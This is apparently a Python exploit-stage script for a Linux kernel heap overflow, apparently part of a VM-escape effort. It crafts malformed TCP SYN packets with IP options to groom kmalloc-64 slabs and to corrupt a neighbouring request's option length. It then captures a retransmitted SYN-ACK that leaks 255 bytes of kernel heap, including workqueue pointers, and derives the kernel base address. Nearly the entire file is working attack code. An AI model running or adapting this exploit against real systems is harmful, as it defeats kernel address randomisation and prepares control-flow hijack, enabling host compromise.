#!/usr/bin/env python3
# r6read.py -- R7 observer-free 255B window, read-only geometry test on r6.
#
# Chain (all slots kmalloc-64, same cache, same CPU7 active slab):
#   [ S_b : overflower dopt ][ S_v : live victim dopt ][ S_w : queued rt6 work ]
#   S_v = S_b + 64, S_w = S_v + 64
#
# Steps:
#   1. allocate N victim requests (dopts) on one page; ECHO map gives slots.
#   2. pick triple S_b,S_v,S_w (all ours, same page).
#   3. RST S_w; IPv6 probe -> rt6_probe work lands at S_w.
#   4. RST S_b; overflower SYN (wire=0x4000) dopt lands at S_b and its
#      64-byte echo covers S_v-32..S_v+31.  Payload[24]=0xff sets the *stored*
#      S_v optlen to 255 (S_v+24 is destination offset 56 = source payload[24]).
#      The write stops at S_v+31 -> work header at S_w is untouched.
#   5. duplicate SYN of the S_v request (seq == original ISN) -> tcp_check_req
#      "pure retransmitted SYN" -> inet_rtx_syn_ack() -> tcp_rtx_synack() ->
#      tcp_v4_send_synack() uses the stored ireq_opt (optlen=255) ->
#      ip_options_build copies 255 B from S_v+32 into the SYN-ACK.
#      work header (S_w) = window offset 32.
#   6. capture the SYN-ACK (host virbr-pwn; guest can sniff the same frame)
#      and compare with r6obs QUEUE ground truth.
#
# Read-only in the sense of no func hijack: only 0x4000 is used, no 0xE000,
# no 0xFF00, no fire.  Observer is used for setup/verification only.
import os, re, sys, time, struct, socket, subprocess

DEV = "r6a"; PEER = "r6b"
SRC4 = bytes([192, 168, 250, 114])   # guest IP: SYN-ACK egresses virbr-pwn
DST4 = bytes([192, 168, 250, 1])     # listener on virbr-pwn: SYN-ACK src is on-egress
LOG = "/tmp/r6new/obs.log"
RT6_OFF = 0x10cbfd0


def sh(c, to=30):
    return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=to)


def ksym(n):
    out = sh("grep -w %s /proc/kallsyms | head -1" % n).stdout.split()
    return int(out[0], 16) if out else 0


def csum(d):
    if len(d) % 2:
        d += b"\0"
    s = sum(struct.unpack(">%dH" % (len(d) // 2), d))
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff


def csum_partial(d):
    s = 0; i = 0
    while i + 1 < len(d):
        s += d[i] | (d[i + 1] << 8); i += 2
    if i < len(d):
        s += d[i]
    return s


def csum_fold(s):
    s = (s & 0xffff) + (s >> 16); s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff


def htons(v):
    return ((v << 8) | (v >> 8)) & 0xffff


def peer_mac():
    try:
        return bytes.fromhex(open("/sys/class/net/%s/address" % PEER).read().strip().replace(":", ""))
    except Exception:
        return b"\xff" * 6


def frame(sport, seq, wire=None, payload=b"\x41" * 64, rst=False):
    hl = 20 if rst else 32
    thlen = 20
    ip = bytearray(hl + thlen + len(payload))
    ip[0] = 0x40 | (hl // 4)
    struct.pack_into(">H", ip, 2, len(ip))
    struct.pack_into(">H", ip, 4, 0x4242)
    ip[8] = 64; ip[9] = 6
    ip[12:16] = SRC4; ip[16:20] = DST4
    if not rst:
        ip[20] = 7; ip[21] = 11; ip[22] = 12
        for i in range(23, 31):
            ip[i] = 0x40 + i
        ip[31] = 0
    th = memoryview(ip)[hl:]
    struct.pack_into(">HHII", th, 0, sport, 7778, seq & 0xffffffff, 0)
    th[12] = 5 << 4
    th[13] = 0x04 if rst else 0x02
    struct.pack_into(">H", th, 14, 0x4000)
    if not rst:
        th[thlen:] = payload
    pseudo = SRC4 + DST4 + b"\0" + bytes([6]) + struct.pack(">H", thlen + len(payload))
    seg = pseudo + bytes(th[:thlen + len(payload)])
    struct.pack_into(">H", th, 16, csum(seg))
    vhdr = bytearray(10)
    if wire is not None:
        want = htons(wire)
        for w in range(65536):
            ip[25] = w & 0xff; ip[26] = (w >> 8) & 0xff
            if csum_fold(csum_partial(bytes(ip[21:]))) == want:
                break
        struct.pack_into(">H", ip, 10, 0)
        struct.pack_into(">H", ip, 10, csum(bytes(ip[:hl])))
        vhdr[0] = 1
        struct.pack_into("<H", vhdr, 6, 14 + 21)   # plain Ethernet: IP+21
    else:
        struct.pack_into(">H", ip, 10, 0)
        struct.pack_into(">H", ip, 10, csum(bytes(ip[:hl])))
    eth = peer_mac() + bytes.fromhex("020000000002") + struct.pack(">H", 0x0800)
    return bytes(vhdr) + eth + bytes(ip)


def sock():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((DEV, 0))
    s.setsockopt(263, 15, 1)      # PACKET_VNET_HDR
    return s


def probe6(gw, s6):
    icmp = struct.pack(">BBHHH", 128, 0, 0, 0x1234, 0) + b"R6R6"
    s6.sendto(icmp, ("fd01:0:%x::1" % gw, 0, 0, 0))


def read_payload():
    # 64-byte wire copy: only payload[0..31] lands in the copy window.
    # dest S_v+16..S_v+31 == source payload[16..31]
    p = bytearray(64)
    p[16:24] = b"\0" * 8          # faddr, nexthop = 0
    p[24] = 0xff                  # optlen = 255  (S_v+24)
    p[25:32] = b"\0" * 7          # srr, rr, ts, flags, router_alert, cipso, pad
    return bytes(p)


def start_obs(rt6, secs=45):
    os.makedirs("/tmp/r6new", exist_ok=True)
    open(LOG, "w").close()
    obs = subprocess.Popen(["/opt/pwnescape/tools/r6obs", "%x" % rt6, str(secs)],
                           stdout=open(LOG, "w"), stderr=subprocess.STDOUT)
    for _ in range(80):
        if "READY" in open(LOG, errors="ignore").read():
            return obs, True
        time.sleep(0.1)
    return obs, False


def parse_obs():
    q = []; e = []; x = []
    for ln in open(LOG, errors="ignore"):
        p = ln.split()
        if not p:
            continue
        try:
            if p[0] == "QUEUE" and len(p) >= 9:
                q.append(dict(work=int(p[1], 16), pwq=int(p[2], 16), data=int(p[3], 16),
                              next=int(p[4], 16), prev=int(p[5], 16), func=int(p[6], 16),
                              cpu=int(p[7])))
            elif p[0] == "EXEC" and len(p) >= 5:
                x.append(dict(work=int(p[1], 16), func=int(p[2], 16), cpu=int(p[3])))
            elif p[0] == "ECHO" and len(p) >= 5:
                e.append(dict(dopt=int(p[1], 16), sport=int(p[2]), cpu=int(p[3]),
                              ts=int(p[4])))
        except Exception:
            pass
    return q, e, x


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 40
    gw = int(sys.argv[2], 0) if len(sys.argv) > 2 else 0x7b00
    rt6 = ksym("rt6_probe_deferred")
    stext = ksym("_stext")
    try:
        os.sched_setaffinity(0, {7})
    except Exception as e:
        print("affinity err", e, flush=True)
    print("read n=%d gw=%#x rt6=%#x stext=%#x cpu=%d" %
          (n, gw, rt6, stext, os.sched_getaffinity(0).pop()), flush=True)

    # fixtures: nexthop-object route => site N (the cache that matched the dopt)
    nhid = 30000 + (gw & 0xffff)
    sh("ip -6 route del fd01:0:%x::/64 2>/dev/null" % gw)
    sh("ip nexthop del id %d 2>/dev/null" % nhid)
    r = sh("ip nexthop add id %d via fe80::%x dev virbr-pwn" % (nhid, gw))
    if r.returncode != 0:
        print("nexthop add failed: %s" % r.stderr.strip(), flush=True)
    sh("ip -6 route replace fd01:0:%x::/64 nhid %d" % (gw, nhid))
    sh("ip -6 neigh replace fe80::%x lladdr 02:00:00:00:00:01 dev virbr-pwn nud failed" % gw)
    # make the guest-side SYN-ACK destination immediately resolvable/observable
    sh("ip neigh replace 192.168.250.114 lladdr 52:54:00:b2:39:e6 dev virbr-pwn nud permanent 2>/dev/null")
    print("aging 11.6s", flush=True)
    time.sleep(11.6)

    sh("pkill -x bpftrace 2>/dev/null; pkill -x r6obs 2>/dev/null")
    time.sleep(0.2)
    obs, ready = start_obs(rt6)
    print("obs_ready=%s" % ready, flush=True)
    if not ready:
        obs.terminate(); return 1

    s6 = socket.socket(socket.AF_INET6, socket.SOCK_RAW, 58)
    s6.bind(("fd00:1::1", 0))
    s = sock()

    # capture socket on the egress interface (and therefore guest-visible)
    cap = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    cap.bind(("virbr-pwn", 0))
    cap.setblocking(False)

    # 1) victims
    base = 51000 + (int(time.time()) % 500)
    seqbase = 0x51000000 + (int(time.time()) & 0xffff) * 256
    sports = set(range(base, base + n))
    for i in range(n):
        s.send(frame(base + i, (seqbase + i) & 0xffffffff))
    time.sleep(0.15)

    q0, e0, x0 = parse_obs()
    emap = {ev["sport"]: ev["dopt"] for ev in e0 if ev["sport"] in sports}
    slots = {sp: (ad - 16) for sp, ad in emap.items()}   # allocation base
    print("victims=%d echo=%d" % (n, len(slots)), flush=True)
    if len(slots) < 8:
        print("ABORT too few dopts"); obs.terminate(); return 1
    pages = {}
    for sp, a in slots.items():
        pages.setdefault(a & ~0xfff, []).append((sp, a))
    last = max(e0, key=lambda ev: ev.get("ts", 0)) if e0 else None
    page = (last["dopt"] - 16) & ~0xfff if last else max(pages, key=lambda p: len(pages[p]))
    print("page=%#x objs=%d (last sport=%s)" % (page, len(pages.get(page, [])),
          last["sport"] if last else "?"), flush=True)

    a2s = {a: sp for sp, a in slots.items()}
    triples = []
    for sp, a in pages.get(page, []):
        b = a - 64; v = a; w = a + 64
        if b in a2s and w in a2s:
            triples.append((b, v, w))
    if not triples:
        print("ABORT no [B][V][W] triple on page"); obs.terminate(); return 1
    # prefer the triple whose slots are latest (sports near the end)
    triples.sort(key=lambda t: a2s[t[2]], reverse=True)
    S_b, S_v, S_w = triples[0]
    sp_b, sp_v, sp_w = a2s[S_b], a2s[S_v], a2s[S_w]
    seq_b = (seqbase + (sp_b - base)) & 0xffffffff
    seq_v = (seqbase + (sp_v - base)) & 0xffffffff
    seq_w = (seqbase + (sp_w - base)) & 0xffffffff
    print("TRIPLE B=%#x(sport %d) V=%#x(%d) W=%#x(%d) page=%#x" %
          (S_b, sp_b, S_v, sp_v, S_w, sp_w, page), flush=True)

    # 2) build all frames before the critical section
    fr_rst_w = frame(sp_w, (seq_w + 1) & 0xffffffff, rst=True)
    fr_rst_b = frame(sp_b, (seq_b + 1) & 0xffffffff, rst=True)
    ov_sp = 47000 + (int(time.time()) % 200)
    fr_ov = frame(ov_sp, 0x60000000, wire=0x4000, payload=read_payload())
    fr_dup_v = frame(sp_v, seq_v)      # pure retransmitted SYN, seq == rcv_isn

    # kworkers SCHED_IDLE on CPU7 (residency)
    kws = sh("ps -eLo tid,psr,comm | awk '$2==7 && /kworker/ {print $1}'").stdout.split()
    for t in kws:
        sh("chrt -i -p 0 %s 2>/dev/null" % t)

    old = os.sched_getscheduler(0)
    t0 = time.time()
    try:
        os.sched_setscheduler(0, os.SCHED_FIFO, os.sched_param(50))
        s.send(fr_rst_w)      # free S_w
        probe6(gw, s6)        # work -> S_w (head)
        s.send(fr_rst_b)      # free S_b
        s.send(fr_ov)         # dopt -> S_b; 64B echo -> S_v header, optlen=255
        s.send(fr_dup_v)      # retransmit SYN-ACK from stored S_v opt (255B)
        dt = (time.time() - t0) * 1e6
    finally:
        os.sched_setscheduler(0, old, os.sched_param(0))
    print("CRITICAL dt=%.0fus" % dt, flush=True)

    # 3) capture
    win = None; capinfo = None
    deadline = time.time() + 0.6
    while time.time() < deadline:
        try:
            fr = cap.recv(65535)
        except BlockingIOError:
            time.sleep(0.002); continue
        except Exception:
            continue
        off = 0
        if len(fr) < 34: continue
        et = struct.unpack(">H", fr[12:14])[0]; off = 14
        while et in (0x8100, 0x88a8) and len(fr) >= off + 4:
            et = struct.unpack(">H", fr[off + 2:off + 4])[0]; off += 4
        if et != 0x0800: continue
        ip = fr[off:]
        if len(ip) < 295 or ip[9] != 6: continue
        if bytes(ip[12:16]) != DST4 or bytes(ip[16:20]) != SRC4: continue
        # malformed 255-byte option header: TCP starts at IP+20+255
        t = 20 + 255
        if struct.unpack(">H", ip[t:t+2])[0] != 7778: continue
        dport = struct.unpack(">H", ip[t+2:t+4])[0]
        if dport != sp_v: continue
        w = bytes(ip[20:275])
        win = w; capinfo = (len(ip), struct.unpack(">H", ip[2:4])[0], dport,
                            struct.unpack(">H", ip[t+14:t+16])[0])
        break
    time.sleep(0.4)
    for t in kws:
        sh("chrt -o -p 0 %s 2>/dev/null" % t)

    q, e, x = parse_obs()
    qw = [ev for ev in q if ev["work"] == S_w]
    ov_echo = [ev for ev in e if ev["sport"] == ov_sp]
    print("QUEUE S_w=%s EXEC S_w=%s ov_echo=%s" % (
        qw[-1] if qw else None,
        [ev for ev in x if ev["work"] == S_w][-1:],
        ov_echo[-1:]), flush=True)
    print("CAPTURE %s" % (capinfo,), flush=True)
    if win is None:
        print("LEAK NO_WINDOW", flush=True); obs.terminate(); return 2
    q0_, q1, q2, q3 = struct.unpack("<4Q", win[32:64])
    print("WINDOW32 data=%#x next=%#x prev=%#x func=%#x" % (q0_, q1, q2, q3), flush=True)
    print("WINHEX %s" % win[:96].hex(), flush=True)
    if qw:
        gt = qw[-1]
        mask_ok = (q0_ & ~0xff) == gt["pwq"]
        func_ok = q3 == gt["func"]
        links_ok = (q1 == gt["next"] and q2 == gt["prev"])
        print("MATCH pwq=%s func=%s links=%s (gt data=%#x next=%#x prev=%#x func=%#x)" %
              (mask_ok, func_ok, links_ok, gt["data"], gt["next"], gt["prev"], gt["func"]),
              flush=True)
        print("DERIVED pwq=%#x poolhead=%#x kbase=%#x" %
              (q0_ & ~0xff, q1, q3 - RT6_OFF), flush=True)
    else:
        print("NO_QUEUE_GROUND_TRUTH (work may have been dequeued or missed S_w)", flush=True)
    obs.terminate()
    return 0


if __name__ == "__main__":
    sys.exit(main())
